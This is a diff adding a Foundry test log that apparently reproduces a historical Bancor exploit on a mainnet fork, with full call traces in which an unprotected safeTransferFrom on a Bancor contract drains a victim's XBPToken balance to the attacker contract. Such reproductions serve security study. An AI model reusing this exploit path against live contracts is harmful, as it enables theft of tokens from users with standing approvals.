@@ -1,0 +1,53 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/Bancor_exp.sol:BancorExploit
+[PASS] testsafeTransfer() (gas: 79975)
+Logs:
+  Victim XBPToken Allowance to Bancor Contract : : 30517969405419767
+  [Before Attack]Victim XBPToken Balance : : 905987
+  [Before Attack]Attacker XBPToken Balance : : 0
+  --------------------------------------------------------------
+  [After Attack]Victim XBPToken Balance : : 0
+  [After Attack]Attacker XBPToken Balance : : 905987
+
+Traces:
+  [5845] BancorExploit::setUp()
+    ├─ [0] VM::createSelectFork("mainnet", 10307563 [1.03e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [84775] BancorExploit::testsafeTransfer()
+    ├─ [2900] XBPToken::allowance(0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E, 0x5f58058C0eC971492166763c8C22632B583F667f) [staticcall]
+    │   └─ ← [Return] 30517969405419767184741663587441118 [3.051e34]
+    ├─ emit log_named_uint(key: "Victim XBPToken Allowance to Bancor Contract : ", val: 30517969405419767 [3.051e16])
+    ├─ [2593] XBPToken::balanceOf(0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E) [staticcall]
+    │   └─ ← [Return] 905987977635678910008152 [9.059e23]
+    ├─ emit log_named_uint(key: "[Before Attack]Victim XBPToken Balance : ", val: 905987 [9.059e5])
+    ├─ [2593] XBPToken::balanceOf(BancorExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "[Before Attack]Attacker XBPToken Balance : ", val: 0)
+    ├─ [0] VM::prank(BancorExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   └─ ← [Return]
+    ├─ [593] XBPToken::balanceOf(0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E) [staticcall]
+    │   └─ ← [Return] 905987977635678910008152 [9.059e23]
+    ├─ [31714] 0x5f58058C0eC971492166763c8C22632B583F667f::safeTransferFrom(XBPToken: [0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40], 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E, BancorExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 905987977635678910008152 [9.059e23])
+    │   ├─ [29930] XBPToken::transferFrom(0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E, BancorExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 905987977635678910008152 [9.059e23])
+    │   │   ├─ emit Transfer(from: 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E, to: BancorExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 905987977635678910008152 [9.059e23])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xab39bd4ed4f120ab16b799b542a9f20cadc701e31bfb4bc86052bf201b781ebc: 0x00000000000000000000000000000000000000000000bfd9b4e8f99ec359cb58 → 0
+    │   │   │   @ 0xed79f5a6103cc2504e2b88abca652130eac5b790c6ddb9e498c6f724905db5d9: 0 → 0x00000000000000000000000000000000000000000000bfd9b4e8f99ec359cb58
+    │   │   │   @ 0x66b84109c8f5a9fd113b760731fbc2d1001ab239ccfefcac3aefa3c56db93eaf: 0x000000000000000000000000000000000005e0a6ed72a6517b17e46772d419de → 0x000000000000000000000000000000000005e0a6ed71e677c62eeac8af7a4e86
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ emit log_string(val: "--------------------------------------------------------------")
+    ├─ [593] XBPToken::balanceOf(0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "[After Attack]Victim XBPToken Balance : ", val: 0)
+    ├─ [593] XBPToken::balanceOf(BancorExploit: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 905987977635678910008152 [9.059e23]
+    ├─ emit log_named_uint(key: "[After Attack]Attacker XBPToken Balance : ", val: 905987 [9.059e5])
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.41s (1.13s CPU time)
+
+Ran 1 test suite in 3.69s (2.41s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
